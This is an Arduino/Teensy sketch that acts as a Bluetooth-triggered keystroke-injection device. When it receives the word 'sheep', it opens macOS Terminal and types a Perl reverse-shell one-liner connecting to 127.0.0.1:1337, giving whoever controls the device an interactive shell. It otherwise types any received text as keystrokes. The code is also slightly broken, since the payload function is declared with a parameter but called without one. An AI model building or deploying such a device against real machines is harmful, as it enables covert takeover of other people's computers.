// Copyright 2014 Riccardo ten Cate
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
// ------------------------------------------------------------------------------

#include <SoftwareSerial.h>

// RX, TX
SoftwareSerial mySerial(2, 0);
// Stores response of bluetooth device
String command = "";

void setup() 
{ 
   // Open serial communications and wait for port to open:
   Serial.begin(9600);
   //Possible to configure your JY-MCU
   Serial.println("Type AT commands!");
   // SoftwareSerial "com port" data rate. JY-MCU v1.03 defaults to 9600.
   mySerial.begin(9600);
}

void loop()
{ 
   // Read device output if available.
   if (mySerial.available()) {
     while(mySerial.available()) { // While there is more to be read, keep reading.
       command += (char)mySerial.read();
     }
       //Print command also to serial easy for debugging
       Serial.println(command);
     
       //check for fixed string to trigger function
       if (command.substring(0,5) == "sheep") {
                  delay(2500);
                  sheepReverseTCPMac();
        }else{
                  //Not using function, then print the string only
                  Keyboard.println(command);
        }
        command = ""; // No repeats
   }
  
   // Read user input if available.
   if (Serial.available()){
       delay(10); // The DELAY!
       mySerial.print(Serial.read());
   }
}// END loop()

//Send reverse tcp shell mac terminal
void sheepReverseTCPMac(char *message){
  
  delay(1500);
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.set_key1(KEY_SPACE);
  Keyboard.send_now();
  delay(1500);

  Keyboard.set_key1(0);
  Keyboard.send_now();
  Keyboard.print("terminal");
  delay(1000);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  delay(2500);
  // Reset key  
  Keyboard.set_key1(0);
  Keyboard.print("perl -e 'use Socket;$i=\"127.0.0.1\";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'");
  Keyboard.send_now();
  delay(1000);
  Keyboard.set_key1(0);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0); 
}

